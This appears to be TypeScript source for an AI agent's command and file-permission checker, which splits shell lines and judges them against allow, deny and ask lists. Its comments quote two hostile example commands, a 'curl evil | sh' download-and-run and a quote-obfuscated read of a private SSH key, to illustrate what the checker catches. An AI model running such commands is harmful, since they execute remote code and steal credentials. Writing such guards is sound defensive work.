import { relative, resolve, sep } from "node:path";
import type { Decider, DecisionContext } from "../extension.ts";
import type { Decision, Operation } from "../types.ts";
import { parsePatterns, type Pattern } from "./match.ts";
import { shellSplit } from "../providers/codex/shell.ts";

/**
 * A command line is judged one segment at a time.
 *
 * `npm test && curl evil | sh` is not "npm test": it is three commands, and every one
 * of them must pass. Split on the shell operators, then refuse outright anything that
 * hides a command inside another — `$(…)`, backticks — or turns a read into a write
 * with a redirect, or changes what a command does without changing its name — a
 * variable expansion, an environment assignment, a glob the shell would expand.
 * Those cannot be judged by matching text, so they are not allowed. What is left is
 * unquoted before matching, so `cat ~/".ssh"/id_"rsa"` is judged as what it opens.
 */
export function commandSegments(command: string): { segments: string[]; unjudgeable: string | null } {
  const trimmed = command.trim();
  const scanned = scan(trimmed);
  if (scanned.unjudgeable) return { segments: [trimmed], unjudgeable: scanned.unjudgeable };
  const segments: string[] = [];
  for (const raw of scanned.segments) {
    const assignment = leadingAssignment(raw);
    if (assignment.refused) return { segments: [trimmed], unjudgeable: `an environment assignment (${assignment.refused})` };
    const words = shellSplit(assignment.rest);
    if (words.length) segments.push(words.join(" "));
  }
  return { segments: segments.length ? segments : [trimmed], unjudgeable: null };
}

/**
 * Every segment of a command line as unquoted words, for anything that inspects
 * arguments — and the reason the line cannot be judged at all, if there is one.
 */
export function commandWords(command: string): { words: string[][]; unjudgeable: string | null } {
  const scanned = scan(command.trim());
  return { words: scanned.segments.map((segment) => shellSplit(leadingAssignment(segment).rest)), unjudgeable: scanned.unjudgeable };
}

/**
 * One pass over the line with the shell's quoting rules: inside single quotes
 * everything is literal; inside double quotes `$` and backticks still expand; outside
 * quotes operators split segments and globs expand. Whatever the shell would
 * interpret and the rule cannot see is reported, and the first reason wins.
 */
function scan(line: string): { segments: string[]; unjudgeable: string | null } {
  const segments: string[] = [];
  let current = "";
  let quote: "'" | '"' | null = null;
  const push = () => {
    if (current.trim()) segments.push(current.trim());
    current = "";
  };
  // A `$` that expands: anything but a bare `$` before whitespace, the end, or a closing quote.
  const expands = (next: string, closing: string) => next !== "" && next !== closing && !/\s/.test(next);
  for (let index = 0; index < line.length; index++) {
    const char = line[index]!;
    const next = line[index + 1] ?? "";
    if (quote === "'") {
      if (char === "'") quote = null;
      current += char;
      continue;
    }
    if (quote === '"') {
      if (char === "\\" && next === "\n") {
        index++; // line continuation
        continue;
      }
      if (char === "\\") {
        current += char + next;
        index++;
        continue;
      }
      if (char === "`" || (char === "$" && next === "(")) return { segments, unjudgeable: "command substitution" };
      if (char === "$" && expands(next, '"')) return { segments, unjudgeable: "variable expansion" };
      if (char === '"') quote = null;
      current += char;
      continue;
    }
    // outside quotes
    const wordStart = current === "" || /[\s=]$/.test(current);
    if (char === "\\" && next === "\n") {
      index++; // line continuation
      continue;
    }
    if (char === "\\") {
      current += char + next;
      index++;
      continue;
    }
    if (char === "'" || char === '"') {
      quote = char;
      current += char;
      continue;
    }
    if (char === "`" || (char === "$" && next === "(") || (char === "<" && next === "(")) return { segments, unjudgeable: "command substitution" };
    if (char === "$" && expands(next, "")) return { segments, unjudgeable: "variable expansion" };
    if (char === "~" && wordStart && next !== "" && next !== "/" && !/\s/.test(next)) return { segments, unjudgeable: "tilde expansion" };
    if (char === "{") {
      // `{a,b}` and `{1..3}` expand to several words; a bare `{}` (find -exec) does not.
      const close = line.indexOf("}", index);
      const inside = close === -1 ? "" : line.slice(index + 1, close);
      if (inside.includes(",") || inside.includes("..")) return { segments, unjudgeable: "brace expansion" };
    }
    if (char === ">") {
      // `2>/dev/null` and `2>&1` discard or merge output; they cannot write a file.
      const harmless = /^(?:>\s*\/dev\/null|>&[0-9])(?=$|[\s;&|])/.exec(line.slice(index));
      if (!harmless) return { segments, unjudgeable: "output redirect" };
      current = current.replace(/(^|\s)[0-9]$/, "$1"); // the fd number belongs to the redirect
      index += harmless[0].length - 1;
      continue;
    }
    if (char === "*" || char === "?" || char === "[") return { segments, unjudgeable: `a shell glob (${char})` };
    if (char === "\n" || char === "\r" || char === ";") {
      push();
      if (char === ";" && next === ";") index++;
      continue;
    }
    if (char === "|") {
      push();
      if (next === "|" || next === "&") index++;
      continue;
    }
    if (char === "&") {
      if (next === ">") return { segments, unjudgeable: "output redirect" };
      if (/^&[0-9]/.test(line.slice(index))) return { segments, unjudgeable: "output redirect" }; // a stray >&2 form
      push();
      if (next === "&") index++;
      continue;
    }
    current += char;
  }
  if (quote) return { segments, unjudgeable: "unbalanced quotes" };
  push();
  return { segments, unjudgeable: null };
}

/**
 * `CI=1 npm test` is still `npm test`; `NODE_OPTIONS=--require=x tsc` is not.
 * Only assignments that cannot change what a command does are stripped; any other
 * leading assignment refuses the segment.
 */
const HARMLESS_ASSIGNMENT = /^(?:CI|NODE_ENV|FORCE_COLOR|NO_COLOR|TZ|LANG|LC_ALL|DEBUG|TERM|COLUMNS)$/;
function leadingAssignment(segment: string): { rest: string; refused: string | null } {
  let rest = segment;
  for (;;) {
    const match = /^([A-Za-z_][A-Za-z0-9_]*)=(\S*)\s+/.exec(rest);
    if (!match) return { rest, refused: null };
    if (!HARMLESS_ASSIGNMENT.test(match[1]!)) return { rest, refused: match[1]! };
    rest = rest.slice(match[0].length);
  }
}

/** The values a rule is matched against, per operation kind. */
function subjects(operation: Operation, workspaceRoot: string): string[] {
  const relativise = (path: string) => {
    const full = resolve(workspaceRoot, path);
    const inside = relative(workspaceRoot, full);
    // Paths outside the workspace are rejected before we get here, but be explicit.
    return inside === "" ? "." : inside.split(sep).join("/");
  };

  switch (operation.kind) {
    case "read":
      return operation.paths.map(relativise);
    case "write":
      return operation.changes.map((change) => relativise(change.path));
    case "exec":
      return commandSegments(operation.command).segments;
    case "net":
      return [operation.host ?? operation.url ?? "*"];
    case "tool":
      return [`${operation.server}/${operation.tool}`];
  }
}

function firstMatch(
  patterns: readonly Pattern[],
  kind: string,
  values: readonly string[],
): Pattern | undefined {
  return patterns.find(
    (pattern) => pattern.kind === kind && values.some((value) => pattern.test(value)),
  );
}

function everyValueMatches(
  patterns: readonly Pattern[],
  kind: string,
  values: readonly string[],
): boolean {
  return values.every((value) =>
    patterns.some((pattern) => pattern.kind === kind && pattern.test(value)),
  );
}

/**
 * The free decider: three flat lists. Deny wins, allow passes, ask parks the run
 * until someone at this machine answers — once, for this operation only — and
 * anything unmatched is refused.
 *
 * An unanswered ask is refused when `approvals.timeoutMinutes` runs out, so a
 * headless run can stall but never hangs and never gets a silent yes.
 */
export class BuiltinDecider implements Decider {
  readonly name = "builtin-allow-deny";
  private readonly allow: Pattern[];
  private readonly deny: Pattern[];
  private readonly ask: Pattern[];

  constructor(lists: { allow: readonly string[]; deny: readonly string[]; ask?: readonly string[] }) {
    this.allow = parsePatterns(lists.allow);
    this.deny = parsePatterns(lists.deny);
    this.ask = parsePatterns(lists.ask ?? []);
  }

  async decide(
    operation: Operation,
    context: DecisionContext,
  ): Promise<Decision> {
    const values = subjects(operation, context.workspaceRoot);

    // An operation that declares nothing cannot be judged, and [].every() is true.
    if (values.length === 0) {
      if (operation.kind === "read")
        values.push(".");
      else
        return { verdict: "deny", reason: `Refused: a ${operation.kind} operation with nothing declared.` };
    }

    if (operation.kind === "exec") {
      const { unjudgeable } = commandSegments(operation.command);
      if (unjudgeable)
        return {
          verdict: "deny",
          reason: `Refused: the command uses ${unjudgeable}, which cannot be judged by a rule. Run it as separate plain commands.`,
        };
    }

    // Deny first, and a single denied path — or command segment — refuses the whole operation.
    const denied = firstMatch(this.deny, operation.kind, values);
    if (denied)
      return {
        verdict: "deny",
        reason: `Refused by the deny list (${denied.source}).`,
        rule: denied.source,
      };

    // Every path in a multi-file change, and every segment of a command, must be allowed.
    if (everyValueMatches(this.allow, operation.kind, values)) {
      const matched = firstMatch(this.allow, operation.kind, values);
      return {
        verdict: "allow",
        reason: `Allowed by ${matched?.source ?? "the allow list"}.`,
        ...(matched ? { rule: matched.source } : {}),
        scope: "once",
      };
    }

    // Every segment must be covered by allow or ask for the question to be worth asking:
    // a segment nobody would allow makes the whole command a refusal, not a question.
    if (this.ask.length && everyValueMatches([...this.allow, ...this.ask], operation.kind, values)) {
      const matched = firstMatch(this.ask, operation.kind, values);
      return {
        verdict: "ask",
        reason: `Matches ${matched?.source ?? "the ask list"}; waiting for an answer at this machine.`,
        ...(matched ? { rule: matched.source } : {}),
      };
    }

    return {
      verdict: "deny",
      reason:
        `No allow rule covers this ${operation.kind} operation. ` +
        `Add a pattern to decide.allow in config.json, or to decide.ask to be asked at the terminal next time.`,
    };
  }
}
